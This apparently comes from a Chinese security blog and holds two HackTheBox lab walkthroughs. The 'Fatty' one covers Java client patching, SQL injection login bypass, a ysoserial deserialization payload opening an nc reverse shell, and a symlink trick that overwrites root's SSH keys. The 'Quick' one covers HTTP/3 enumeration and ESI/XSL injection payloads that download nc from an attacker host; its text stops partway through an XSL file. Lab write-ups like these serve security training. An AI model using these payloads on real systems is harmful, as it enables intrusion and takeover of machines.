\xdcSF:\\xcev\\x99\\xdfe~\\xd9L\\xbd\\xf5&amp;=\\t-\\\"\\xae\\xdb\\x8c\\xac\\(\\xea'q\\x8e\\xa2\\xbaSF:\\.t\\n\\xc1s\\xe6\\xb8\\xdd\\x07uV\\xafk=\\x0cB\\xaa5s\\xc0\\xf4\\xb0\\xaa\\x9aRF\\$\\xSF:f7\\[X\\xa9\\x91\\xb6\\xde\\xa086\\x8b\\x92\\x94\\xda\\xa0\\x06y\\x07\\x97\\*h\\x01\")%rSF:(RTSPRequest,80,\"I\\x89\\x15\\xdc\\x1d\\xa3\\\\\\x1b\\x80E`\\xb4\\x01\\x16\\xa0\\xce,SF:\\xccLX%\\x80\\x8e\\x15\\x15\\?\\xcef\\x01\\x1fm\\x02\\x9aE\\xde\\xba\\\\/\\x1a\\x89\\xf7SF:;\\xdf\\x95\\xcdC\\xa0\\xbc\\]\\xcc\\xdd\\?w2\\xc0x\\xfb\\xd7s\\xcf\\x8f\\xe7f&gt;_\\xe1\\xSF:f5W\\xb2\\x1e\\xcdc\\x1b\\xa9\\x0f\\n\\xab\\x9d\\xcad\\xc1\\xb9\\x8f\\+\\x1e\\xdd\\$\\xadSF:\\x87\\x04\\$\\xc2\\x86W7\\xe4\\x84\\[H\\x18\\xae\\xb2\\xbbYx\\x8b\\x8d\\xcf\\x91\\xc6&amp;\\SF:xcfv\\xc6\\xe16\\x14\\xa3\\xcfW\\xfa2\\xdc\\xb0\\xb0o\\xcd\\x10\")%r(RPCCheck,80,\"\\SF:^Mw\\xfc\\xa4z%\\x0e\\xf8\\xd9\\xcfI\\x94\\x06\\xa4\\xee\\xea4fL\\xaa\\x8b\\x18\\x06\\xSF:e7u%\\t\\xb6\\x80\\xaadY\\xb2v;\\xa5a\\x9c\\x05\\]w\\x8a\\x8b9\\xe3\\xb6\\xa8C\\xcb\\|WSF:\\x9b\\xec\\x0b\\x0b&lt;P\\xd4\\\\h\\x16\\x0e\\x1b\\x01\\x9d\\xce\\xb0\\xde/\\xdb\\x1d\\(\\xdSF:0\\xf7\\xf0\\xd5\\x81\\xd9\\xf6\\x06T\\xc0lF\\t\\(p\\xfb\\xab\\xcan\\xa9\\xcc\\xf0yJ\\xdSF:b\\xa0O\\xf5G\\x91\\xf2z\\xed\\xfa\\xa2\\xc4\\xd5\\x83\\xc2\\xb2\\xfa\\xd1=\\x8czY\\x1aSF:E\\xb3\\xde\\xe4a\\x89\\x8a\\xdf\");==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port1339-TCP:V=7.80%T=SSL%I=7%D=8/5%Time=5F2A34DE%P=x86_64-apple-darwinSF:18.6.0%r(NULL,80,\"\\xfa!\\xb47\\x9d\\xb8\\x9e\\\"\\xe1\\xe5\\xaapi-\\xe1\\x1eT\\x96wSF:\\x86\\x93\\xba\\x9caf\\xb4\\xe6\\xcf\\xcf\\xa6zS\\xdf\\x1d\\x96\\xcb'V\\[;\\xe2\\['\\x1SF:4\\+\\xe8\\xc3\\x8a\\x9cC\\xbcp\\x03\\xd2\\\\'vF\\x83\\xbdv\\x1f\\$N\\xfdL\\x99\\x8a\\x87SF:@3&#123;\\xfb4b\\r\\x9f_\\x97X\\xa5&#123;\\xc7\\xe0_\\xc6HV\\xa7\\xf5d@\\xae\\xdat\\x03\\xb6\\x1SF:d\\xd0\\x92b\\x83\\x7f\\xcby\\xf6\\+3\\xd1L\\xabn\\0\\xddR\\xd5\\xd0\\xb9\\xf6\\xc9\\x9fSF:0\\x96\\x0e=O\\x90\\x8b\")%r(GenericLines,80,\"\\xfa!\\xb47\\x9d\\xb8\\x9e\\\"\\xe1\\xSF:e5\\xaapi-\\xe1\\x1eT\\x96w\\x86\\x93\\xba\\x9caf\\xb4\\xe6\\xcf\\xcf\\xa6zS\\xdf\\x1dSF:\\x96\\xcb'V\\[;\\xe2\\['\\x14\\+\\xe8\\xc3\\x8a\\x9cC\\xbcp\\x03\\xd2\\\\'vF\\x83\\xbdv\\SF:x1f\\$N\\xfdL\\x99\\x8a\\x87@3&#123;\\xfb4b\\r\\x9f_\\x97X\\xa5&#123;\\xc7\\xe0_\\xc6HV\\xa7\\xfSF:5d@\\xae\\xdat\\x03\\xb6\\x1d\\xd0\\x92b\\x83\\x7f\\xcby\\xf6\\+3\\xd1L\\xabn\\0\\xddR\\SF:xd5\\xd0\\xb9\\xf6\\xc9\\x9f0\\x96\\x0e=O\\x90\\x8b\")%r(GetRequest,80,\"\\xfe\\x03\\SF:x87-\\^\\xe3\\xec\\x80\\xc2\\xce7g\\xdd\\xcc\\x0f\\xfeQE6\\xd8\\xd6\\xd1b\\x93\\xef\\[&gt;SF:1\\xc0\\xcd\\x1ct\\xf5\\x0b\\xd2R\\xfa\\xd6\\x9f\\x17\\x9f\\x0et\\xab\\x9a`M\\x98`=k\\xSF:de\\xcd\\xbe\\xee\\x1f\\x93\\x07\\xe1\\*\\x86\\x14\\x07\\x14X&gt;_L\\xc3\\x8c~\\xe1T\\xe1\\SF:x9b\\0\\xce\\xac\\x04\\xfb\\xa7\\xfc\\xfd\\xe8\\xe0\\xd2M\\xe3\\x85\\x881\\xf8\\xd3\\xd4SF:uY\\xb6&#123;\\x01\\xd4\\xb9=f\\x87\\x91\\xf5\\xccEG\\xbb5\\*&gt;\\xf1!\\xd4\\x89\\xb5%\\x94\\xSF:18\\x92\\x17\\xdfH\\xfe\\xc4v\")%r(HTTPOptions,80,\"\\xe4\\x8d7,TC\\xa1\\x8f\\x10\\xSF:85\\x94\\xd4hY\\x9a\\x84\\xc3R\\^\\xf8\\xe6\\x9f:\\xa2JQ\\x0c\\xd1\\xc6\\x1e\\x8c\\xff\\SF:xf3\\x9c\\x9fZ\\xd9b\\x1a\\xda\\x07\\xc7\\xaf\\xbddO\\x17\\xe0\\xd9\\xcc\\xfe\\xc2\\x0bSF:\\xae\\xf6\\xc4\\x12=\\xd4\\x05\\xc2\\x93\\xa2\\x16\\x9b&gt;u\\x94\\xdd\\x08\\xed\\xed\\xb3SF:&#123;\\xa7\\xe3=\\r\\x89\\x0fBe\\x86\\xc7:\\xae\\xc7\\x1a\\xb8\\xf8C\\xe8\\xf3\\x9f\\\\\\xcf\\SF:xdb\\x9a\\x8a\\r@\\x8c\\x99\\x8b\\\"\\xa6#8\\t!9~\\x80\\xdc\\xc8\\xa7\\xf6n\\x81\\n\\x18jSF:w\\xf2\\x17\\xe7&gt;\\xc4\")%r(RTSPRequest,80,\"#V\\xa5\\xb4\\x03\\xe1&gt;\\x9b\\x82\\xc7VSF:\\x01G\\x1d\\xa3\\xecm\\]\\x12N&#125;\\x96\\xa0xH\\xdb\\)d\\x86i\\xe7\\^\\0\\x0bx\\xe5\\(\\xcbSF:\\xf0\\x18\\xc9\\x1c\\x94\\x91\\xaaM\\)V\\.e/\\x8f\\xca\\xb7\\x18\\xb5\\xde\\x04\\x1a\\x0SF:8\\[\\x88\\xd5\\xc2\\x0f\\xb5dg9wm\\xb1\\xcb\\xba\\xa1\\xcf6zU\\xfc\\xe92\\xa8\\x8bR\\xSF:18\\xf0\\n\\x1a\\xf2\\xd8\\x86\\x1e\\xd7\\xd9&#123;\\xde\\xa4\\xda\\xa1&gt;l\\x14E\\xef2\\x1b\\xSF:9d\\x9e\\xd3\\^\\x10\\|\\x8a\\x1e\\x112\\xb0\\xa6\\xda\\xd0!\\xb7E\\xad8T\\xbf\")%r(RPCSF:Check,80,\"\\(\\xae`\\r5\\x88\\x9d@F\\xa0\\xe6\\x85\\x9fSeM\\^\\x17\\xb6e\\xd1/\\xbc\\xSF:e8A\\xcd\\xa4\\x10\\n\\x05\\x0fT\\xdc\\xa1\\xb1q\\x91\\xa9\\xf5`\\xc2`\\x90W\\x19\\x8c\\SF:x0eVI\\x86\\x80\\x12\\xd4\\x1cK\\xfc\\xe4\\xadfS\\xf7,\\xf3\\xdc\\xa5t\\xce\\x9df\\x91SF:I\\xb4\\xc8F\\xac\\xa6b\\x89\\xea\\xe9\\xf5\\xafq\\xf3\\x13\\xa1\\x1bP\\x18\\xe0#!1K\\xSF:c6M\\x96\\xe9\\xf9\\xcd\\xc7\\xe3\\xb0\\*\\xe5\\x8c\\x12\\xc6\\xda\\xef\\xc2\\xe9\\x965\\SF:x98\\x9fW\\xc3\\xf9\\x0fEgn\\x17iy\\0\\xc3\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: -1s, deviation: 0s, median: -1sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 74.67 seconds 21FTP可以匿名访问，里面有一些文件，下载下来： 123456789101112131415161718192021222324252627282930313233343536373839404142434445➜ Fatty ftp 10.10.10.174Connected to 10.10.10.174.220 qtc's development serverName (10.10.10.174:miao): anonymous230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; quote pasv227 Entering Passive Mode (10,10,10,174,185,136).ftp&gt; passivePassive mode on.ftp&gt; ls227 Entering Passive Mode (10,10,10,174,187,39).150 Here comes the directory listing.-rw-r--r-- 1 ftp ftp 15426727 Oct 30 2019 fatty-client.jar-rw-r--r-- 1 ftp ftp 526 Oct 30 2019 note.txt-rw-r--r-- 1 ftp ftp 426 Oct 30 2019 note2.txt-rw-r--r-- 1 ftp ftp 194 Oct 30 2019 note3.txt226 Directory send OK.ftp&gt; get *local: * remote: *227 Entering Passive Mode (10,10,10,174,193,90).550 Failed to open file.ftp&gt; mget *mget fatty-client.jar?227 Entering Passive Mode (10,10,10,174,179,171).150 Opening BINARY mode data connection for fatty-client.jar (15426727 bytes).226 Transfer complete.15426727 bytes received in 23.40 secs (643.7956 kB/s)mget note.txt?227 Entering Passive Mode (10,10,10,174,179,86).150 Opening BINARY mode data connection for note.txt (526 bytes).226 Transfer complete.526 bytes received in 0.00 secs (3.1549 MB/s)mget note2.txt?227 Entering Passive Mode (10,10,10,174,179,254).150 Opening BINARY mode data connection for note2.txt (426 bytes).226 Transfer complete.426 bytes received in 0.00 secs (308.3882 kB/s)mget note3.txt?227 Entering Passive Mode (10,10,10,174,162,237).150 Opening BINARY mode data connection for note3.txt (194 bytes).226 Transfer complete.194 bytes received in 0.00 secs (142.7680 kB/s)ftp&gt; 3个txt和一个jar文件： 那个jar文件应该是连接某个服务的客户端，那个服务原本是8000端口，现在改成了1337端口，并且给出了运行环境问题和一组账号密码： 12User: qtcPass: clarabibi fatty-client.jar代理连接直接运行是连接失败： 根据前面的信息，以及反编译看代码，我们知道客户端配置的是8000端口，而现在服务是在1337端口，我们需要想办法进行转发(或者直接修改代码重新打包，需要解决签名校验)： 这里可以直接用simpleproxy之类的做个代理,并且配置好hosts： 1234simpleproxy -L 8000 -R 10.10.10.174:1337# hosts10.211.55.12 server.fatty.htb 然后就可以成功登录： 修改重打包直接反编译修改重新打包运行的话，会有一个签名校验问题： 修改后重新打包： 1jar -cmf META-INF&#x2F;MANIFEST.MF ..&#x2F;new.jar * 运行登录会得到如上报错，存在校验，beans.xml被修改导致不匹配，SHA-256 digest error for beans.xml 可以直接把 META-INF/1.RSA META-INF/1.SF这两个文件删了，然后打包，就可以解决签名校验问题： 文件浏览有一个文件浏览功能，限定目录，根据报错可以得到基础路径：/opt/fatty/files/ ( 反编译可以看到这个功能应该是在Invoker中的showFile函数中将Folder作为参数，sendAndRecv 另外ClientGuiTest中定义目录名，我们可以修改后获取其他目录文件： 例如将config目录修改成..，从而查看上层目录文件 下面是直接修改jd-gui反编译的java文件，然后patch到原本的jar 12345678910zip -d fatty-client.jar META-INF/1.RSA META-INF/1.SFzip -ur fatty-client.jar .javac -cp ../fatty-client.jar htb/fatty/client/gui/ClientGuiTest.javamkdir rawcp fatty-client.jar raw/fatty-client.jarcd raw &amp;&amp; unzip fatty-client.jarcd .. &amp;&amp; mv htb/fatty/client/gui/*.class raw/htb/fatty/client/gui/cd raw &amp;&amp; jar -cmf META-INF/MANIFEST.MF traverse.jar .java -jar traverse.jar 然后发现一个fatty-server.jar文件： start.sh123456789101112131415#!/bin/sh# Unfortunately alpine docker containers seems to have problems with services.# I tried both, ssh and cron to start via openrc, but non of them worked. Therefore, # both services are now started as part of the docker startup script.# Start cron servicecrond -b# Start ssh server/usr/sbin/sshd# Start Java application serversu - qtc /bin/sh -c \"java -jar /opt/fatty/fatty-server.jar\" fatty-server.jar下载文件这里我们修改open函数用于下载fatty-server.jar文件： 12345678910111213141516171819import java.io.FileOutputStream;... FileOutputStream fos; fos = new FileOutputStream(\"/tmp/fatty-server.jar\"); if (this.response.hasError()) &#123; return \"Error: Your action caused an error on the application server!\"; &#125; String response = \"\"; try &#123; response = this.response.getContentAsString(); &#125; catch (Exception e) &#123; response = \"Unable to convert byte[] to String. Did you read in a binary file?\"; &#125; fos.write(this.response.getContent()); fos.close(); return response;... 之后重新打包运行,下载得到fatty-server.jar文件: 反编译同样是反编译，然后FattyDbSession.java:checkLogin(User user)有一个注入： 就是客户端登录时username那里注入 Userhtb/fatty/client/shared/resources/user.java得到密码加密方式，username没经过任何处理： 123456789101112131415public User(int uid, String username, String password, String email, Role role) &#123; this.uid = uid; this.username = username; String hashString = this.username + password + \"clarabibimakeseverythingsecure\"; MessageDigest digest = null; try &#123; digest = MessageDigest.getInstance(\"SHA-256\"); &#125; catch (NoSuchAlgorithmException e) &#123; e.printStackTrace(); &#125; byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8)); this.password = DatatypeConverter.printHexBinary(hash); this.email = email; this.role = role; &#125; 注入基本就是分析代码，构造注入, 客户端也需要做下修改方便操作： 然后使用： 12Username : abc&#39; UNION SELECT 1,&#39;abc&#39;,&#39;a@b.com&#39;,&#39;abc&#39;,&#39;adminPassword : abc 这样拼接成的sql是： 1SELECT id,username,email,password,role FROM users WHERE username&#x3D;&#39;abc&#39; UNION SELECT 1,&#39;abc&#39;,&#39;a@b.com&#39;,&#39;abc&#39;,&#39;admin 然后就可以伪造管理员登录： 反序列化登录后修改密码功能有反序列化： 参考资料： What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/ 修改密码功能在客户端没完全实现，需要自己修补代码 添加功能首先修改changePW函数，使其发送payload： 123456789public String changePW(String payload) throws MessageParseException, MessageBuildException, IOException &#123; this.action = new ActionMessage(this.sessionID, \"changePW\"); this.action.addArgument(payload); sendAndRecv(); if (this.response.hasError()) &#123; return \"Error: Your action caused an error on the application server!\"; &#125; return this.response.getContentAsString(); &#125; 然后修改changePW执行函数： 12345678910111213141516jButton4.addActionListener(new ActionListener() &#123; public void actionPerformed(ActionEvent param1ActionEvent) &#123; String str1 = \"\"; String str2 = ClientGuiTest.this.textField_1.getText(); try &#123; str1 = ClientGuiTest.this.invoker.exploitChangePW(str2); &#125; catch (MessageBuildException|htb.fatty.shared.message.MessageParseExceptionmessageBuildException) &#123; JOptionPane.showMessageDialog(controlPanel, \"Failure during message building/parsing.\", \"Error\", 0); &#125; catch (IOException iOException) &#123; JOptionPane.showMessageDialog(controlPanel, \"Unable to contact the server. If this problem remains, please close and reopen the client.\", \"Error\", 0); &#125; textPane.setText(str1); passwordChange.setVisible(false); controlPanel.setVisible(true); &#125; &#125;); 我这里不小心删掉了修改好的jar包，不想重新开始一点点改了，后面的主要就是流程 反序列化getshell然后就是生成序列化payload，监听端口，修改密码发送payload，getshell： 1java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'nc 10.10.14.22 7777 -e /bin/sh' | base64 -w 0 user flag反序列化得到qtc用户的shell，user.txt没有读权限自己加一下就可以，得到user flag： 123chmod +r user.txtcat user.txt7fab****2073 提权信息这一步是有一个定时任务： 1scp qtc:&lt;container_ip&gt;:&#x2F;opt&#x2F;fatty&#x2F;tar&#x2F;logs.tar &#x2F;unknown&#x2F;location&#x2F;logs.tar 如果我们使用软连接，将/root/.ssh/authorized_keys软连接到/opt/fatty/tar/logs.tar，然后它会自动scp到host之后解压，导致： /unknown/location/logs.tar -&gt; /root/.ssh/authorized_keys 然后我们把公钥写到logs.tar，等待下一次备份即可覆写server的/root/.ssh/authorized_keys 然后我们直接用自己的私钥即可登录： root flag登录上去直接读root.txt: ee98****d9c7 参考资料 https://github.com/vzaliva/simpleproxy What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/ HTB: Fatty | 0xdf hacks stuffhttps://0xdf.gitlab.io/2020/08/08/htb-fatty.html#get-fatty-clientjar-functioning https://www.hackthebox.eu/home/machines/writeup/227","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Quick - HackTheBox","slug":"Quick-HackTheBox","date":"2020-08-07T01:33:36.000Z","updated":"2020-08-31T06:24:02.819Z","comments":true,"path":"2020/08/07/Quick-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/08/07/Quick-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/244 10.10.10.186 端口扫描22和9001，注意还需要udp扫描(udp扫描需要root权限)，443端口是udp，代表是HTTP/3 ： 12345678910111213141516171819$ nmap -sC -sV 10.10.10.186Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-06 15:01 CSTNmap scan report for 10.10.10.186Host is up (0.069s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)| 256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)|_ 256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)9001/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Quick | Broadband ServicesService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 117.27 seconds 90019001有个登录界面： HTTP/3要访问HTTP3的4423，我们需要使用Quic协议，有两种方式 使用Quiche 使用支持quiche/0.2.0协议的curl Docker 镜像 主流浏览器测试版本都支持，参见https://developers.cloudflare.com/http3/intro/curl-brew/ 这里选用curl，quiche方式可以看参考资料 1234567docker run -it --rm ymuski/curl-http3 curl -Vcurl 7.71.0-DEV (x86_64-pc-linux-gnu) libcurl/7.71.0-DEV BoringSSL quiche/0.4.0Release-Date: [unreleased]Protocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftpFeatures: alt-svc AsynchDNS HTTP3 HTTPS-proxy IPv6 Largefile NTLM NTLM_WB SSL UnixSockets 直接进到docker容器里方便操作： 1sudo docker run --net host --privileged -it --rm ymuski/curl-http3 /bin/bash index1234567891011121314151617181920212223242526272829303132333435363738root@docker-desktop:/opt# curl --http3 https://10.10.10.186/&lt;html&gt;&lt;title&gt; Quick | Customer Portal&lt;/title&gt;&lt;h1&gt;Quick | Portal&lt;/h1&gt;&lt;head&gt;&lt;style&gt;ul &#123; list-style-type: none; margin: 0; padding: 0; width: 200px; background-color: #f1f1f1;&#125;li a &#123; display: block; color: #000; padding: 8px 16px; text-decoration: none;&#125;/* Change the link color on hover */li a:hover &#123; background-color: #555; color: white;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt; Welcome to Quick User Portal&lt;/p&gt;&lt;ul&gt; &lt;li&gt;&lt;a href=\"index.php\"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"index.php?view=contact\"&gt;Contact&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"index.php?view=about\"&gt;About&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"index.php?view=docs\"&gt;References&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/html&gt; 有一些页面，我们可以去访问 contactContact里是一些人员信息： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667root@docker-desktop:/opt# curl --http3 https://10.10.10.186/index.php?view=contact&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;&lt;style&gt;body &#123;font-family: Arial, Helvetica, sans-serif;&#125;* &#123;box-sizing: border-box;&#125;input[type=text], select, textarea &#123; width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; margin-top: 6px; margin-bottom: 16px; resize: vertical;&#125;input[type=submit] &#123; background-color: #4CAF50; color: white; padding: 12px 20px; border: none; border-radius: 4px; cursor: pointer;&#125;input[type=submit]:hover &#123; background-color: #45a049;&#125;.container &#123; border-radius: 5px; background-color: #f2f2f2; padding: 20px;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Quick | Contact&lt;/h1&gt;&lt;div class=\"container\"&gt; &lt;form action=\"/\"&gt; &lt;label for=\"fname\"&gt;First Name&lt;/label&gt; &lt;input type=\"text\" id=\"fname\" name=\"firstname\" placeholder=\"Your name..\"&gt; &lt;label for=\"lname\"&gt;Last Name&lt;/label&gt; &lt;input type=\"text\" id=\"lname\" name=\"lastname\" placeholder=\"Your last name..\"&gt; &lt;label for=\"country\"&gt;Country&lt;/label&gt; &lt;select id=\"country\" name=\"country\"&gt; &lt;option value=\"australia\"&gt;Australia&lt;/option&gt; &lt;option value=\"canada\"&gt;Canada&lt;/option&gt; &lt;option value=\"usa\"&gt;USA&lt;/option&gt; &lt;/select&gt; &lt;label for=\"subject\"&gt;Subject&lt;/label&gt; &lt;textarea id=\"subject\" name=\"subject\" placeholder=\"Write something..\" style=\"height:200px\"&gt;&lt;/textarea&gt; &lt;input type=\"submit\" value=\"Submit\"&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; about123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122root@docker-desktop:/opt# curl --http3 https://10.10.10.186/index.php?view=about&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;&lt;style&gt;body &#123; font-family: Arial, Helvetica, sans-serif; margin: 0;&#125;html &#123; box-sizing: border-box;&#125;*, *:before, *:after &#123; box-sizing: inherit;&#125;.column &#123; float: left; width: 33.3%; margin-bottom: 16px; padding: 0 8px;&#125;.card &#123; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2); margin: 8px;&#125;.about-section &#123; padding: 50px; text-align: center; background-color: #474e5d; color: white;&#125;.container &#123; padding: 0 16px;&#125;.container::after, .row::after &#123; content: \"\"; clear: both; display: table;&#125;.title &#123; color: grey;&#125;.button &#123; border: none; outline: 0; display: inline-block; padding: 8px; color: white; background-color: #000; text-align: center; cursor: pointer; width: 100%;&#125;.button:hover &#123; background-color: #555;&#125;@media screen and (max-width: 650px) &#123; .column &#123; width: 100%; display: block; &#125;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=\"about-section\"&gt; &lt;h1&gt;Quick | About Us &lt;/h1&gt;&lt;/div&gt;&lt;h2 style=\"text-align:center\"&gt;Our Team&lt;/h2&gt;&lt;div class=\"row\"&gt; &lt;div class=\"column\"&gt; &lt;div class=\"card\"&gt; &lt;img src=\"/w3images/team1.jpg\" alt=\"Jane\" style=\"width:100%\"&gt; &lt;div class=\"container\"&gt; &lt;h2&gt;Jane Doe&lt;/h2&gt; &lt;p class=\"title\"&gt;CEO &amp; Founder&lt;/p&gt; &lt;p&gt;Quick Broadband services established in 2012 by Jane.&lt;/p&gt; &lt;p&gt;jane@quick.htb&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"column\"&gt; &lt;div class=\"card\"&gt; &lt;img src=\"/w3images/team2.jpg\" alt=\"Mike\" style=\"width:100%\"&gt; &lt;div class=\"container\"&gt; &lt;h2&gt;Mike Ross&lt;/h2&gt; &lt;p class=\"title\"&gt;Sales Manager&lt;/p&gt; &lt;p&gt;Manages the sales and services.&lt;/p&gt; &lt;p&gt;mike@quick.htb&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"column\"&gt; &lt;div class=\"card\"&gt; &lt;img src=\"/w3images/team3.jpg\" alt=\"John\" style=\"width:100%\"&gt; &lt;div class=\"container\"&gt; &lt;h2&gt;John Doe&lt;/h2&gt; &lt;p class=\"title\"&gt;Web Designer&lt;/p&gt; &lt;p&gt;Front end developer.&lt;/p&gt; &lt;p&gt;john@quick.htb&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; docs两个pdf： 12345678910111213root@docker-desktop:/opt# curl --http3 https://10.10.10.186/index.php?view=docs&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;&lt;h1&gt;Quick | References&lt;/h1&gt;&lt;ul&gt; &lt;li&gt;&lt;a href=\"docs/QuickStart.pdf\"&gt;Quick-Start Guide&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"docs/Connectivity.pdf\"&gt;Connectivity Guide&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/head&gt;&lt;/html&gt; Connectivity.pdf &amp; QuickStart.pdf 下载下来查看: 12curl --http3 https://10.10.10.186/docs/Connectivity.pdf -o Connectivity.pdfcurl --http3 https://portal.quick.htb/docs/QuickStart.pdf -o QuickStart.pdf 得到一个密码：Quick4cc3$$ 用户名字典 &amp; 爆破我们得到了一个密码，可能需要一个账号去登录9001端口的页面。 注意前面contact页面有一些用户信息，9001端口clients里是一些公司信息和国家信息： 这些信息组合成邮箱地址，使用得到密码进行爆破，最终得到一组有效账号： 1elisa@wink.co.uk : Quick4cc3$$ Esigate有个功能，使用的是Esigate： 搜索能够找到相关ESI注入： ESI Injection Part 2: Abusing specific implementations | GoSecurehttps://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/ 那么我们就需要三步： 传nc 给nc添加执行权限 反弹shell 就是提交payload得到一个id，然后搜索id触发命令： getshell三步依次进行，getshell： wget.xsl123456789101112131415&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;&lt;xsl:stylesheet version&#x3D;&quot;1.0&quot; xmlns:xsl&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot;&gt;&lt;xsl:output method&#x3D;&quot;xml&quot; omit-xml-declaration&#x3D;&quot;yes&quot;&#x2F;&gt;&lt;xsl:template match&#x3D;&quot;&#x2F;&quot;xmlns:xsl&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot;xmlns:rt&#x3D;&quot;http:&#x2F;&#x2F;xml.apache.org&#x2F;xalan&#x2F;java&#x2F;java.lang.Runtime&quot;&gt;&lt;root&gt;&lt;xsl:variable name&#x3D;&quot;cmd&quot;&gt;&lt;![CDATA[wget http:&#x2F;&#x2F;10.10.14.2:7778&#x2F;nc -O vnc]]&gt;&lt;&#x2F;xsl:variable&gt;&lt;xsl:variable name&#x3D;&quot;rtObj&quot; select&#x3D;&quot;rt:getRuntime()&quot;&#x2F;&gt;&lt;xsl:variable name&#x3D;&quot;process&quot; select&#x3D;&quot;rt:exec($rtObj, $cmd)&quot;&#x2F;&gt;Process: &lt;xsl:value-of select&#x3D;&quot;$process&quot;&#x2F;&gt;Command: &lt;xsl:value-of select&#x3D;&quot;$cmd&quot;&#x2F;&gt;&lt;&#x2F;root&gt;&lt;&#x2F;xsl:template&gt;&lt;&#x2F;xsl:stylesheet&gt; chmod.xsl123456789101112131415&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;&lt;xsl:stylesheet version&#x3D;&quot;1.0&quot; xmlns:xsl&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot;&gt;&lt;xsl:output method&#x3D;&quot;xml&quot; omit-xml-declaration&#x3D;&quot;yes&quot;&#x2F;&gt;&lt;xsl:template match&#x3D;&quot;&#x2F;&quot;xmlns:xsl&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot;xmlns:rt&#x3D;&quot;http:&#x2F;&#x2F;xml.apache.org&#x2F;xalan&#x2F;java&#x2F;java.lang.Runtime&quot;&gt;&lt;root&gt;&lt;xsl:variable name&#x3D;&quot;cmd&quot;&gt;&lt;![CDATA[chmod 777 vnc]]&gt;&lt;&#x2F;xsl:variable&gt;&lt;xsl:variable name&#x3D;&quot;rtObj&quot; select&#x3D;&quot;rt:getRuntime()&quot;&#x2F;&gt;&lt;xsl:variable name&#x3D;&quot;process&quot; select&#x3D;&quot;rt:exec($rtObj, $cmd)&quot;&#x2F;&gt;Process: &lt;xsl:value-of select&#x3D;&quot;$process&quot;&#x2F;&gt;Command: &lt;xsl:value-of 